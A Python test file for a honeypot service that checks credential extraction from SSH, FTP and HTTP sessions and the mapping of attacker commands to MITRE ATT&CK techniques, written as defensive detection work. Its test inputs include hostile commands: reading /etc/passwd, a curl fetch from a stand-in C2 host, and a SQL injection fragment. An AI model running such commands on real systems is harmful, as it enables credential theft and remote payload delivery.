"""
ShieldNet — Test Honeypot Engine
Verifies honeypot credential extraction and MITRE TTP classification.
"""
from __future__ import annotations

import base64
from backend.services.honeypot.service import _extract_credentials, _classify_ttps


def test_extract_credentials_ssh_ftp_telnet():
    """Test username/password extraction from plain session protocols."""
    # Test SSH patterns
    ssh_data = b"login: admin\r\npassword: supersecret123\r\n"
    creds = _extract_credentials("ssh", ssh_data)
    assert len(creds) == 1
    assert creds[0]["username"] == "admin"
    assert creds[0]["password"] == "supersecret123"

    # Test FTP patterns
    ftp_data = b"USER anonymous\r\nPASS guest\r\n"
    creds = _extract_credentials("ftp", ftp_data)
    assert len(creds) == 1
    assert creds[0]["username"] == "anonymous"
    assert creds[0]["password"] == "guest"


def test_extract_credentials_http():
    """Test HTTP basic auth and form-based auth extraction."""
    # Basic auth test
    encoded = base64.b64encode(b"admin:secretpassword").decode("utf-8")
    http_basic = f"GET /admin HTTP/1.1\r\nAuthorization: Basic {encoded}\r\n\r\n".encode()
    creds = _extract_credentials("http", http_basic)
    assert len(creds) == 1
    assert creds[0]["username"] == "admin"
    assert creds[0]["password"] == "secretpassword"

    # Form post test
    http_form = b"POST /login HTTP/1.1\r\nContent-Length: 35\r\n\r\nusername=testuser&password=mysecurepassword"
    creds = _extract_credentials("http", http_form)
    assert len(creds) == 1
    assert creds[0]["username"] == "testuser"
    assert creds[0]["password"] == "mysecurepassword"


def test_classify_ttps():
    """Test mapping commands to MITRE ATT&CK TTPs."""
    # System discovery command
    ttps = _classify_ttps("ssh", ["whoami", "uname -a"])
    assert "T1082" in ttps  # System Information Discovery
    assert "T1110" in ttps  # SSH base Brute Force

    # OS credential dumping command
    ttps = _classify_ttps("ftp", ["cat /etc/passwd"])
    assert "T1003" in ttps  # OS Credential Dumping

    # Exfiltration / download tool
    ttps = _classify_ttps("telnet", ["curl http://malicious-c2.com/payload"])
    assert "T1041" in ttps  # Exfiltration Over C2

    # SQL Injection pattern
    ttps = _classify_ttps("http", ["union select username, password from users"])
    assert "T1190" in ttps  # Exploit Public-Facing App

    # Command shell usage
    ttps = _classify_ttps("ssh", ["/bin/bash", "ls"])
    assert "T1059" in ttps  # Interpreter
